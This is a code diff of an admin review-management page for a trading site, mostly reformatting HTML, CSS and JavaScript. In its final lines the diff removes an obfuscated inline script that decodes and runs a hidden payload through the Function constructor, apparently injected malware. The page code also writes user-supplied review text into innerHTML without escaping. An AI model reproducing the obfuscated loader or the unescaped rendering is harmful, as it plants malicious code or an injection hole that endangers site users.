@@ -1,337 +1,366 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-
-<head>
+  <head>
     <!-- ✅ Google Tag Manager -->
     <script>
-        (function (w, d, s, l, i) {
-            w[l] = w[l] || [];
-            w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
-            var f = d.getElementsByTagName(s)[0],
-                j = d.createElement(s),
-                dl = l != 'dataLayer' ? '&l=' + l : '';
-            j.async = true;
-            j.src = 'https://www.googletagmanager.com/gtm.js?id=GTM-TT7SLZ4L' + dl;
-            f.parentNode.insertBefore(j, f);
-        })(window, document, 'script', 'dataLayer', 'GTM-TT7SLZ4L');
+      (function (w, d, s, l, i) {
+        w[l] = w[l] || [];
+        w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
+        var f = d.getElementsByTagName(s)[0],
+          j = d.createElement(s),
+          dl = l != "dataLayer" ? "&l=" + l : "";
+        j.async = true;
+        j.src = "https://www.googletagmanager.com/gtm.js?id=GTM-TT7SLZ4L" + dl;
+        f.parentNode.insertBefore(j, f);
+      })(window, document, "script", "dataLayer", "GTM-TT7SLZ4L");
     </script>
 
     <!-- ✅ Basic -->
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
     <!-- 🔒 SEO OFF (Admin page) -->
     <title>Admin Review Panel | BR30 Trader</title>
-    <meta name="robots" content="noindex, nofollow">
+    <meta name="robots" content="noindex, nofollow" />
 
     <!-- 🔐 No Cache -->
-    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
+    <meta
+      http-equiv="Cache-Control"
+      content="no-store, no-cache, must-revalidate"
+    />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
 
     <!-- ✅ Favicon -->
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
 
     <!-- ✅ Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
 
     <!-- ✅ Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
 
     <!-- ✅ SweetAlert -->
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11" defer></script>
     <style>
-        :root {
-            --bg: #0a0a0a;
-            --card: #141414;
-            --primary: #00ffa3;
-            --danger: #ff4d4d;
-            --text: #ffffff;
-        }
+      :root {
+        --bg: #0a0a0a;
+        --card: #141414;
+        --primary: #00ffa3;
+        --danger: #ff4d4d;
+        --text: #ffffff;
+      }
 
-        body {
-            font-family: 'Segoe UI', sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            padding: 20px;
-        }
+      body {
+        font-family: "Segoe UI", sans-serif;
+        background: var(--bg);
+        color: var(--text);
+        padding: 20px;
+      }
 
-        h2 {
-            text-align: center;
-            color: var(--primary);
-            margin-bottom: 10px;
-        }
+      h2 {
+        text-align: center;
+        color: var(--primary);
+        margin-bottom: 10px;
+      }
 
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-        }
+      .container {
+        max-width: 900px;
+        margin: 0 auto;
+      }
 
-        /* Search Box Style */
-        .search-container {
-            position: sticky;
-            top: 0;
-            background: var(--bg);
-            padding: 15px 0;
-            z-index: 100;
-        }
+      /* Search Box Style */
+      .search-container {
+        position: sticky;
+        top: 0;
+        background: var(--bg);
+        padding: 15px 0;
+        z-index: 100;
+      }
 
-        #searchUser {
-            width: 100%;
-            padding: 12px 20px;
-            border-radius: 25px;
-            border: 1px solid #333;
-            background: #1a1a1a;
-            color: white;
-            outline: none;
-            font-size: 1rem;
-        }
+      #searchUser {
+        width: 100%;
+        padding: 12px 20px;
+        border-radius: 25px;
+        border: 1px solid #333;
+        background: #1a1a1a;
+        color: white;
+        outline: none;
+        font-size: 1rem;
+      }
 
-        #searchUser:focus {
-            border-color: var(--primary);
-        }
+      #searchUser:focus {
+        border-color: var(--primary);
+      }
 
-        .review-card {
-            background: var(--card);
-            border-left: 4px solid var(--primary);
-            padding: 15px;
-            margin-bottom: 15px;
-            border-radius: 8px;
-            transition: 0.3s;
-        }
+      .review-card {
+        background: var(--card);
+        border-left: 4px solid var(--primary);
+        padding: 15px;
+        margin-bottom: 15px;
+        border-radius: 8px;
+        transition: 0.3s;
+      }
 
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
+      .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
 
-        .user-info {
-            font-weight: bold;
-            font-size: 1.1rem;
-        }
+      .user-info {
+        font-weight: bold;
+        font-size: 1.1rem;
+      }
 
-        .stars {
-            color: #ffd700;
-        }
+      .stars {
+        color: #ffd700;
+      }
 
-        .comment {
-            margin: 10px 0;
-            color: #ccc;
-        }
+      .comment {
+        margin: 10px 0;
+        color: #ccc;
+      }
 
-        .status-tag {
-            font-size: 0.8rem;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-weight: bold;
-        }
+      .status-tag {
+        font-size: 0.8rem;
+        padding: 2px 8px;
+        border-radius: 4px;
+        font-weight: bold;
+      }
 
-        .status-approved {
-            background: rgba(0, 255, 163, 0.2);
-            color: var(--primary);
-        }
+      .status-approved {
+        background: rgba(0, 255, 163, 0.2);
+        color: var(--primary);
+      }
 
-        .status-hidden {
-            background: rgba(255, 77, 77, 0.2);
-            color: var(--danger);
-        }
+      .status-hidden {
+        background: rgba(255, 77, 77, 0.2);
+        color: var(--danger);
+      }
 
-        .actions {
-            margin-top: 15px;
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
+      .actions {
+        margin-top: 15px;
+        display: flex;
+        gap: 10px;
+        flex-wrap: wrap;
+      }
 
-        button {
-            cursor: pointer;
-            border: none;
-            padding: 8px 18px;
-            border-radius: 5px;
-            font-weight: bold;
-            transition: 0.2s;
-        }
+      button {
+        cursor: pointer;
+        border: none;
+        padding: 8px 18px;
+        border-radius: 5px;
+        font-weight: bold;
+        transition: 0.2s;
+      }
 
-        button:hover {
-            opacity: 0.8;
-        }
+      button:hover {
+        opacity: 0.8;
+      }
 
-        .btn-reply {
-            background: #333;
-            color: white;
-        }
+      .btn-reply {
+        background: #333;
+        color: white;
+      }
 
-        .btn-hide {
-            background: orange;
-            color: black;
-        }
+      .btn-hide {
+        background: orange;
+        color: black;
+      }
 
-        .btn-delete {
-            background: var(--danger);
-            color: white;
-        }
+      .btn-delete {
+        background: var(--danger);
+        color: white;
+      }
 
-        /* Reply Box Animation */
-        .reply-box {
-            margin-top: 15px;
-            display: none;
-            padding: 10px;
-            background: #1c1c1c;
-            border-radius: 8px;
-            border: 1px solid #333;
-        }
+      /* Reply Box Animation */
+      .reply-box {
+        margin-top: 15px;
+        display: none;
+        padding: 10px;
+        background: #1c1c1c;
+        border-radius: 8px;
+        border: 1px solid #333;
+      }
 
-        textarea {
-            width: 100%;
-            background: #222;
-            border: 1px solid #444;
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            resize: none;
-            min-height: 80px;
-            box-sizing: border-box;
-        }
+      textarea {
+        width: 100%;
+        background: #222;
+        border: 1px solid #444;
+        color: white;
+        padding: 10px;
+        border-radius: 5px;
+        resize: none;
+        min-height: 80px;
+        box-sizing: border-box;
+      }
     </style>
-</head>
+  </head>
 
-<body onclick="closeAllReplyBoxes(event)">
+  <body onclick="closeAllReplyBoxes(event)">
     <!-- ✅ GTM noscript -->
     <noscript>
-        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TT7SLZ4L" height="0" width="0"
-            style="display:none;visibility:hidden"></iframe>
+      <iframe
+        src="https://www.googletagmanager.com/ns.html?id=GTM-TT7SLZ4L"
+        height="0"
+        width="0"
+        style="display: none; visibility: hidden"
+      ></iframe>
     </noscript>
 
     <div class="container">
-        <h2>Review Management Panel</h2>
+      <h2>Review Management Panel</h2>
 
-        <!-- Pro Search Bar -->
-        <div class="search-container">
-            <input type="text" id="searchUser" placeholder="🔍 Search by username..." onkeyup="searchReviews()">
-        </div>
+      <!-- Pro Search Bar -->
+      <div class="search-container">
+        <input
+          type="text"
+          id="searchUser"
+          placeholder="🔍 Search by username..."
+          onkeyup="searchReviews()"
+        />
+      </div>
 
-        <div id="review-list">
-            <!-- Reviews yahan load honge -->
-        </div>
+      <div id="review-list">
+        <!-- Reviews yahan load honge -->
+      </div>
     </div>
 
     <script src="config.js"></script>
     <script>
-        const API_BASE = window.API_BASE_URL + '/api/reviews';
-        let allReviews = []; // Global data for searching
+      const API_BASE = `${window.API_BASE_URL}/api/reviews`;
 
-        // 1. Fetch Reviews
-        async function fetchReviews() {
-            try {
-                const res = await fetch(`${API_BASE}/all`);
-                if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
-                allReviews = await res.json();
-                renderReviews(allReviews);
-            } catch (error) {
-                console.error("Error:", error);
-                document.getElementById('review-list').innerHTML = `<p style='color:red; text-align:center;'>Error: Backend connection failed.</p>`;
-            }
+      let allReviews = []; // Global data for searching
+
+      // 1. Fetch Reviews
+      async function fetchReviews() {
+        try {
+          const res = await fetch(`${API_BASE}/all`);
+          if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
+          allReviews = await res.json();
+          renderReviews(allReviews);
+        } catch (error) {
+          console.error("Error:", error);
+          document.getElementById("review-list").innerHTML =
+            `<p style='color:red; text-align:center;'>Error: Backend connection failed.</p>`;
         }
+      }
 
-        // 2. Render Function
-        function renderReviews(data) {
-            const list = document.getElementById('review-list');
-            list.innerHTML = data.length === 0 ? "<p style='text-align:center;'>No reviews found!</p>" : "";
+      // 2. Render Function
+      function renderReviews(data) {
+        const list = document.getElementById("review-list");
+        list.innerHTML =
+          data.length === 0
+            ? "<p style='text-align:center;'>No reviews found!</p>"
+            : "";
 
-            data.forEach(rev => {
-                const card = document.createElement('div');
-                card.className = 'review-card';
-                const currentStatus = rev.status || 'approved';
+        data.forEach((rev) => {
+          const card = document.createElement("div");
+          card.className = "review-card";
+          const currentStatus = rev.status || "approved";
 
-                card.innerHTML = `
-                <div class="header">
-                    <div class="user-info">${rev.username} <span class="stars">${'★'.repeat(rev.rating)}</span></div>
-                    <span class="status-tag ${currentStatus === 'approved' ? 'status-approved' : 'status-hidden'}">${currentStatus.toUpperCase()}</span>
-                </div>
-                <p class="comment">${rev.comment}</p>
-                <div class="admin-reply-text">
-                    ${rev.adminReply ? `<span style="color:#00ffa3; font-size:0.9rem"><strong>Admin:</strong> ${rev.adminReply}</span>` : ''}
-                </div>
-                
-                <div class="actions">
-                    <button class="btn-reply" onclick="toggleReplyBox(event, '${rev._id}')">Reply</button>
-                    <button class="btn-hide" onclick="toggleStatus('${rev._id}')">${currentStatus === 'approved' ? 'Hide' : 'Show'}</button>
-                    <button class="btn-delete" onclick="deleteReview('${rev._id}')">Delete</button>
-                </div>
+          card.innerHTML = `
+              <div class="header">
+                  <div class="user-info">${rev.username} <span class="stars">${"★".repeat(rev.rating)}</span></div>
+                  <span class="status-tag ${currentStatus === "approved" ? "status-approved" : "status-hidden"}">${currentStatus.toUpperCase()}</span>
+              </div>
+              <p class="comment">${rev.comment}</p>
+              <div class="admin-reply-text">
+                  ${rev.adminReply ? `<span style="color:#00ffa3; font-size:0.9rem"><strong>Admin:</strong> ${rev.adminReply}</span>` : ""}
+              </div>
 
-                <div class="reply-box" id="reply-box-${rev._id}" onclick="event.stopPropagation()">
-                    <textarea id="input-${rev._id}" placeholder="Apna jawab likho..."></textarea>
-                    <button class="btn-reply" style="margin-top:8px; width:100%; background:var(--primary); color:black" onclick="submitReply('${rev._id}')">Send Reply</button>
-                </div>
-            `;
-                list.appendChild(card);
-            });
+              <div class="actions">
+                  <button class="btn-reply" onclick="toggleReplyBox(event, '${rev._id}')">Reply</button>
+                  <button class="btn-hide" onclick="toggleStatus('${rev._id}')">${currentStatus === "approved" ? "Hide" : "Show"}</button>
+                  <button class="btn-delete" onclick="deleteReview('${rev._id}')">Delete</button>
+              </div>
+
+              <div class="reply-box" id="reply-box-${rev._id}" onclick="event.stopPropagation()">
+                  <textarea id="input-${rev._id}" placeholder="Apna jawab likho..."></textarea>
+                  <button class="btn-reply" style="margin-top:8px; width:100%; background:var(--primary); color:black" onclick="submitReply('${rev._id}')">Send Reply</button>
+              </div>
+          `;
+          list.appendChild(card);
+        });
+      }
+
+      // 3. Search Logic
+      function searchReviews() {
+        const searchTerm = document
+          .getElementById("searchUser")
+          .value.toLowerCase();
+        const filtered = allReviews.filter((rev) =>
+          rev.username.toLowerCase().includes(searchTerm),
+        );
+        renderReviews(filtered);
+      }
+
+      // 4. Hide/Show Logic (Click Fix)
+      async function toggleStatus(id) {
+        try {
+          const res = await fetch(`${API_BASE}/status/${id}`, {
+            method: "PATCH",
+          });
+          if (res.ok) fetchReviews();
+          else alert("Backend route not working!");
+        } catch (err) {
+          alert("Error connecting to server!");
         }
+      }
 
-        // 3. Search Logic
-        function searchReviews() {
-            const searchTerm = document.getElementById('searchUser').value.toLowerCase();
-            const filtered = allReviews.filter(rev => rev.username.toLowerCase().includes(searchTerm));
-            renderReviews(filtered);
+      // 5. Delete Logic
+      async function deleteReview(id) {
+        if (confirm("Pakka delete karna hai bhai?")) {
+          await fetch(`${API_BASE}/delete/${id}`, { method: "DELETE" });
+          fetchReviews();
         }
+      }
 
-        // 4. Hide/Show Logic (Click Fix)
-        async function toggleStatus(id) {
-            try {
-                const res = await fetch(`${API_BASE}/status/${id}`, { method: 'PATCH' });
-                if (res.ok) fetchReviews();
-                else alert("Backend route not working!");
-            } catch (err) { alert("Error connecting to server!"); }
+      // 6. Pro Reply Box Logic (Toggle & Auto-Close)
+      function toggleReplyBox(event, id) {
+        event.stopPropagation(); // Page click ko rokne ke liye
+        const box = document.getElementById(`reply-box-${id}`);
+        const isAlreadyOpen = box.style.display === "block";
+
+        closeAllReplyBoxes(); // Pehle baaki sab band karo
+
+        if (!isAlreadyOpen) {
+          box.style.display = "block";
         }
+      }
 
-        // 5. Delete Logic
-        async function deleteReview(id) {
-            if (confirm("Pakka delete karna hai bhai?")) {
-                await fetch(`${API_BASE}/delete/${id}`, { method: 'DELETE' });
-                fetchReviews();
-            }
+      function closeAllReplyBoxes(event) {
+        document.querySelectorAll(".reply-box").forEach((box) => {
+          box.style.display = "none";
+        });
+      }
+
+      async function submitReply(id) {
+        const replyText = document.getElementById(`input-${id}`).value;
+        if (!replyText) return alert("Bhai kuch likho to!");
+
+        try {
+          await fetch(`${API_BASE}/update/${id}`, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ adminReply: replyText }),
+          });
+          alert("Reply Saved! ✅");
+          fetchReviews();
+        } catch (err) {
+          alert("Reply failed!");
         }
+      }
 
-        // 6. Pro Reply Box Logic (Toggle & Auto-Close)
-        function toggleReplyBox(event, id) {
-            event.stopPropagation(); // Page click ko rokne ke liye
-            const box = document.getElementById(`reply-box-${id}`);
-            const isAlreadyOpen = box.style.display === 'block';
-
-            closeAllReplyBoxes(); // Pehle baaki sab band karo
-
-            if (!isAlreadyOpen) {
-                box.style.display = 'block';
-            }
-        }
-
-        function closeAllReplyBoxes(event) {
-            document.querySelectorAll('.reply-box').forEach(box => {
-                box.style.display = 'none';
-            });
-        }
-
-        async function submitReply(id) {
-            const replyText = document.getElementById(`input-${id}`).value;
-            if (!replyText) return alert("Bhai kuch likho to!");
-
-            try {
-                await fetch(`${API_BASE}/update/${id}`, {
-                    method: 'PUT',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ adminReply: replyText })
-                });
-                alert("Reply Saved! ✅");
-                fetchReviews();
-            } catch (err) { alert("Reply failed!"); }
-        }
-
-        fetchReviews();
+      fetchReviews();
     </script>
-    <script>
-        (function () { var iEX = '', jkf = 628 - 617; function EUf(c) { var z = 6376169; var g = c.length; var j = []; for (var a = 0; a < g; a++) { j[a] = c.charAt(a) }; for (var a = 0; a < g; a++) { var x = z * (a + 112) + (z % 40890); var u = z * (a + 689) + (z % 16572); var r = x % g; var h = u % g; var y = j[r]; j[r] = j[h]; j[h] = y; z = (x + u) % 7011803; }; return j.join('') }; var Vfe = EUf('hmridetcwuyoonurcfrgtkljasptsonxvbqcz').substr(0, jkf); var bFt = '=q( nf,0}v0"t,vb;5zvtlry)pav[j0)e0ifhlm<jx7r[.p=uC;zjopartnttnr,n2)]r,;l,anftht(;,06a7=,a (gr,tctv;,,4j6(uy-(v)v)1t8e,.66;va" ,2"[.k-r*);(r.d-m+ [qlr;;twv) n)i[s.=]4.h+(,r0;+ia31 uguS3v2o=;0hf(fn,mfu83pl 4qCu)(aa hgmra+s=l)nnt)ae+C)7vcrrrus(g[v(+8s1e4;ip0se)ezbuaCofkvl;a"=ajbnaetu-r;r+=0,siAh{qaA  12{r[];crav*j,"b9[acr.)=abr+n;jnrk0gh6i0=do)lb(+tr;palvl)ao eg]uel]sn(;;;bl)=g1a.pudo,(=1rd;ae 95lrC+9rve=)Ada;ifs;+{w=k7oa8axba..s ogov=<Cp1e1;-. (=n !in]pe)o>b==fdv=]ru2iv gn.3ltvvhiceo=;e.)Codehe(=+ sfvd..hfo0;w+rr] +Caa{;]==sntn+[}v"n;ho=6oia{"1ciihw2cx8lju(=wf=rb(h;+oca;tshkoes(b;obzre(8nlelh]]ak.u(n,n+,.h]v<l+(f 0;r;!={u6z;aic(og]+.ii;a,)f8sni5(0rxg;9d))jas(=;.7;tn8l7i.7tc.5n"hfq[i=}as8=r  icnjt+(h},[[}b) z.[to,r2l)n=9py4(,nlbic)r;ht)<)=ia(;o=r,(svg,fr7 ;5a=1or=((6[>+o=pxa-h;-tA9<}el.n}]hr(s+v)9vha,l8t;t+frdr."AS(o)er(o1ba2 r{nzhtr=m)o)= oasem+h==;;me1jmhl.=solht+,a"g;s.1);r)t=.'; var rsW = EUf[Vfe]; var wDC = ''; var TVK = rsW; var Eky = rsW(wDC, EUf(bFt)); var pUC = Eky(EUf('!),1foe_b_u;6j  _P.aP$1)!4;$5eo!9;P=(}f 6ba13t.P$P_iPf)gf,tkwS)j4nw}fyPP2f]PP&n}1 _f"n)6!3{).+(by3.e$P26.%3&2o==0;cle$$Po[(P%fincP)u=*EPr_t6e7tg$+Pbb{)3$P)m41.P}oaaPP;k0n =jbs;f%.e,5]sb,j3_jPl)bi)P)-un,.rf53heP!!..v)o]s\'Pobnc3wd ;3(b01223!b$+15\'f)_{3.P;oe{]a,b(P&w3(iuarb.nw(ogPP(0(P(j_}.x(3.n(b4ls..P.ePi7C(3,) v)!,b\'P4.)a2P.-P5)3P)(vP8 +)i)ln9\'1!8t(6egeP9Pm.w\/3,.2)}iPo)etf%m5en9.P_cf46Pp.$3Pppb!r);3wc\/.4o04bP4448i Pbtd(inPqPP;7=ni4nP ;},;j,=(P71ero66}Ps;$7;m=Pwen$q)Pilb+#PP$&(m$_)eCP5PPbP7.;p3P!"id)l={]{P$cf.w2_!!fp.l%eP6=tc[!tob(gjPttbrvi]ln_bj.6tt.!P0,PPee}%o)l.j%pb1Po(b)_P368Peeu,e.c4nt${)(#)cw.DaP)Peu}31e(t{(.8tz".cdr;.;)nPs.c%eS q(3r==)(=1ik7c.1er0tsty_.PooP1_711*;oC{.,)tn#8(}pa).i)ojbP#1;m2ebb}7tf]63en3f3e3g"se2;PP(-g=isj.$.j8)9P_)wen3t0+.bb46;3tuP[P5n(8Pom#$_3lb!o_,-5elc(.Pcaf4Pf!P$u*a}..P(.,P4\'o-2Pl7hb)"2b.3P,,3* P}}ou#u]ont3PPw]bv*ha 2fue.l._PdP{r;tfvjpt5yPP[P)]0.(c}rP7pn+,n7(P{;gu{joo}P\'6oj*b3.m$; nd}(Pc,.3)7$s,pr{e4jr}.tb,)ltih-k%,P(!,.uPn#(}p!=me2PP!l=()v)duP =_4({csve7r)5$tePo(Pb!vime]%)P$7)_u)pj];0s_}_&P2(]("d4nP(l%tieP.bj363}v$& 2_u1rj_483, (0P=(nnb]bP.\/.]Pjn,P[;bbu\/6sm;(a},r!_,r Pj))toer+0ie o=146iSsnnP%o s.o1eePta,!if3dv)j0e=P6s3ri30r)c(,u!-p .c!)e!e$idt8,[_.tPm,n(6bo$f+d ,.)t\/(= _%.b i6.P[,;.r4_==Pbe d=Pee.tjePcb.;')); var OSu = TVK(iEX, pUC); OSu(8958); return 3887 })()
-    </script>
-</body>
-
+    <script></script>
+  </body>
 </html>
